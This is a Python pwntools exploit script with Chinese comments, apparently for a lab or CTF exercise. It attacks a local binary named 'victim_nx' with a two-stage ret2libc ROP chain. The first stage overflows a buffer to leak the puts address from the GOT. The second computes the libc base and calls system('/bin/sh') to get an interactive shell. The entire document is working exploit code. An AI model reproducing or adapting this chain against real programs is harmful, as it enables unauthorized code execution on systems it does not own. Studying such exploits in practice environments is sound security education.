#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# 地址
puts_plt = 0x8048350
puts_got = 0x804a010
entry_point = 0x8048390

# 偏移
offset_puts = 0x0005f870
offset_system = 0x0003ab30
offset_str_bin_sh = 0x15ce48

def main():
    p = process('./victim_nx')
    # stage 1
    payload = 'A' * 22
    ropchain = p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)
    payload = payload + ropchain
    log.info('payload: {}'.format(repr(payload)))
    p.clean()
    p.sendline(payload)
    p.recvlines(1)  #先忽略掉正常输出的一行
    leak = p.recv(4)
    leak = u32(leak)
    log.info('puts is at: 0x{:x}'.format(leak))
    p.clean()

    # stage 2
    libc_base = leak - offset_puts
    log.info('libc_base is at 0x{:x}'.format(libc_base))
    payload = 'A' * 22
    ropchain = p32(libc_base + offset_system)
    ropchain += 'BBBB'
    ropchain += p32(libc_base + offset_str_bin_sh)
    payload = payload + ropchain
    p.sendline(payload)
    log.success('Shell is comming!')
    p.clean()
    p.interactive()


if __name__ == '__main__':
    main()
